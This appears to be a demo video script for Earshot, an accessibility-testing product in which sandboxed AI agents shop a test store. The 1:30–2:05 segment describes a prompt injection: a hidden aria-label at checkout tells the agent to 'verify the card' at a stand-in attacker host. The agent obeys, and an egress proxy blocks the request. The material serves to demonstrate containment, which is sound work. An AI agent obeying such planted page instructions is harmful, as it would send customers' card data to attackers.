# Earshot demo video script (≤ 3 min)

Record at 1920×1080 against the live Vultr URL. Use a real run where the injection is obeyed and BLOCKED (see [e2e-log.md](e2e-log.md)). Never stage the BLOCKED row: it must come from the proxy.

| Time | Picture | Voice-over / sound |
|---|---|---|
| **0:00–0:10** | Black screen, then the broken checkout fades in, blurred | **Listen audio only**, unedited: "button. button. link. image. edit text. edit text…" |
| 0:10–0:14 | Title card: **Earshot** · "Rules don't fail customers. Journeys do." | — |
| 0:14–0:28 | Home page | "That's a checkout as a screen reader hears it. Europe's Accessibility Act has been enforced since June 2025, and US stores face thousands of ADA lawsuits a year. Checkers test rules. Customers fail on journeys." |
| 0:28–0:45 | Press **Run the demo** → the rail shows **two sandboxes created**: `runsc · 1 GiB · 0.75 CPU · 256 pids` | "Two agents, same model, same goal. One sees the screen. One gets only the accessibility tree. Each runs in its own gVisor sandbox on a Vultr VM. No keys inside, capped resources, one way out through our egress proxy." |
| 0:45–1:10 | Columns stream. Sighted picks a grind and moves on. Blind: `click a8 → not-actionable`, then **Stalled** | "The sighted agent picks 'whole bean'. The blind agent finds only text. Those swatches are divs with click handlers, invisible to assistive tech." |
| 1:10–1:30 | **Finding card**: snippet, *Wrong role · Not keyboard operable*, **WCAG 4.1.2 / 2.1.1**, Listen to this region | "Earshot doesn't guess. A fresh inspector sandbox replays the sighted path and checks the element: role, name, keyboard, label, axe-core. Confirmed." |
| 1:30–2:05 | **Fix & verify** → the Rerun 1 column. It passes the grind picker, reaches checkout, then: `go to https://cardcheck.attacker.invalid… → navigation-blocked`. A red **BLOCKED by egress proxy** row appears in the rail | "The model writes a patch: attributes only, applied by a fixed template. A fresh blind rerun now gets past the grind picker… and reaches checkout, where a hidden aria-label tells it to 'verify the card' on an attacker's site. It obeys. Our proxy doesn't. The card number never leaves the sandbox." |
| 2:05–2:25 | Later reruns fix the checkout fields and the span button. The **approval modal** at Place order → **Deny** → `sandbox destroyed` | "Fixes stack until the blind agent reaches Place order. Purchases always need a human. I deny it, and the sandbox is destroyed." |
| 2:25–2:45 | Architecture slide: Vultr VM (control, proxy, store, gVisor sandboxes) + Vultr Serverless Inference | "Everything runs on Vultr: Cloud Compute orchestrates disposable sandboxes, and Serverless Inference powers both agents, the fixes and the voice you heard." |
| 2:45–3:00 | Home hero | "And the same accessibility tree is what AI shopping agents read. Fix it for screen readers and you fix it for them. Earshot: rules don't fail customers. Journeys do." |

**Containment moment (required):** 1:30–2:05, the real proxy BLOCKED row. Also show `docker inspect` env for one sandbox (two EARSHOT_ vars, no keys) for 2 s as a cutaway at 0:40.

**Backup:** if a full demo run doesn't show the injection being obeyed, record the **Injection drill** preset for the 1:30–2:05 segment and label it on screen "Injection drill (starts at checkout)".
